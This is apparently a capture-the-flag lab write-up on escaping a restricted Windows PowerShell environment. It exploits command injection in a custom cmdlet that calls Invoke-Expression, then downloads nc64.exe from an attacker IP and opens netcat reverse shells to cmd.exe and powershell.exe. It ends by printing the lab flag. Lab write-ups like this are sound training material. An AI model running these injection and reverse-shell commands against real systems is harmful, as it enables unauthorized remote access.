After getting access to the Windows machine, if you try to run some simple commands, it seems to be in some sort of a restricted environment:

![[Privilege Escalation-20250413193701775.webp]]

## Get-Command

The Get-Command cmdlet gets all commands that are installed on the computer, including cmdlets, aliases, functions, filters, scripts, and applications:

![[Privilege Escalation-20250413193958931.webp]]

## Get-ServicesApplication

For each command can be displayed a help for using the command, i.e.
`Get-Command -ShowCommandInfo Get-ServicesApplication`

![[Privilege Escalation-20250413195209015.webp]]

You can see that it is using *Invoke-Expression* which allows for execution code. There seems to be some filters in place but we can use the payload of *Get-ServicesApplication -Filter '$(<command>)'*.

Run:
```
Get-ServicesApplication -Filter '$(dir)'
```


![[Privilege Escalation-20250413195827661.webp]]



## Reverse Shell

With the previous command we can establish a reverse shell with *netcat*.

#Attacking_Machine 
1. Create a python http server on the directory where you have nc64.exe.
```
python3 -m http.server 80
```

#Powershell
2. Run the following code to download the *nc64.exe* payload.
```
Get-ServicesApplication -Filter '$(powershell wget http://10.50.97.227/nc64.exe -outfile C:\\windows\\Temp\\nc64.exe)'
```

#Attacking_Machine 
3. Open a netcat listener.
```
rlwrap nc -lnvp 4445
```

#Powershell 
4. Run the payload.
```
Get-ServicesApplication -Filter '$(C:\\windows\\Temp\\nc64.exe 10.50.97.227 4445 -e cmd.exe)'

```

![[Privilege Escalation-20250413205504091.webp]]

>[!Warning]
The shell is not very stable but if we just execute the payload one more time we can maintain it a bit longer but it is not a guaranteed.


Run the following code and you'll get a more stable shell.

```
Get-ServicesApplication -Filter '$(C:\\windows\\Temp\\nc64.exe 10.50.97.227 4445 -e powershell.exe)'
```


## Flag 2
On the new shell run:
```
cd C:\users\Administrator\Desktop

cat root.txt
```

>[!Success]
>The flag is THM{FULL_PRIVILEGES_HERE_THE_ESCAPE_IS_DONE}
